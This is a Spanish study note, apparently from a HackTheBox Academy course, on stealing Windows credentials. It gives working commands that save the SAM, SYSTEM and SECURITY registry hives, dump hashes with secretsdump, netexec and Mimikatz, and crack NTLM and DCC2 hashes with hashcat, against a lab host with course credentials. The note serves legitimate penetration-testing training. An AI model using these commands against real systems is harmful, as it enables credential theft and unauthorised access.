Se desarrolla esta nota a parte para dedicarla específicamente a los ataques de credenciales en un sistema windows, ya que tiene muchas variantes, tipos y es  complejo aunque los ataques sean relativamente automatizados.

# SAM, SYSTEM, SECURITY
Si tenemos acceso como administrador a una maquina, tenemos 3 hives de registro interesantes.

| Hive del Registro | Descripción                                                                                                                                                                            |
| ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HKLM\SAM`        | Contiene los hashes de las contraseñas para las cuentas de usuario locales. Estos hashes pueden ser extraídos y craqueados para revelar las contraseñas en texto plano.                |
| `HKLM\SYSTEM`     | Almacena la clave de arranque del sistema, que se utiliza para cifrar la base de datos SAM. Esta clave es necesaria para descifrar los hashes.                                         |
| `HKLM\SECURITY`   | Contiene información sensible utilizada por la Autoridad de Seguridad Local (LSA), incluyendo credenciales de dominio en caché (DCC2), contraseñas en texto claro, claves DPAPI y más. |
#### 1. Backup de hives del registro
Con este backup podemos posteriormente realizar un volcado de hashes de credenciales de usuario, que será lo que posteriormente crackearemos
```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

#### 2. Volcado de hashes
Para descifrar los hashes de SAM necesitamos volcarlos utilizando la clave HKLM\KEY
```python
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Volcado remoto de hashes
```bash
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

#### 3. Crackear hashes NTLM de cuentas locales
teniendo los hashes en un fichero de esta manera
```bash
sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
```

Crackeamos con hashcat
```bash
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

#### 3. Crackear hashes DCC2 de cuentas de dominio
Con el HKLM\SECURITY tenemos informacion de inicio de sesion de dominio en caché tras el volcado, si el equipo pertenece a un dominio.

Ejemplo de hash
```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

Crack con hashcat
```
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

### Secretos LSA
Con acceso administrador se pueden atacar a los secretos LSA a través de la red. esto nos permite extraer credenciales de servicios en ejecución, tareas programadas o aplicaciones que almacenan contraseñas usando secretos de LSA

##### Volcado de secretos LSA
```bash
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

### Extracción hashes cuentas locales SAM con Mimikatz
```powershell
./mimikatz.exe

// 1. Elevar privilegios al nivel de SYSTEM para acceder a los ficheros protegidos
token::elevate

// 2. Extraer los hashes del fichero SAM
lsadump::sam

```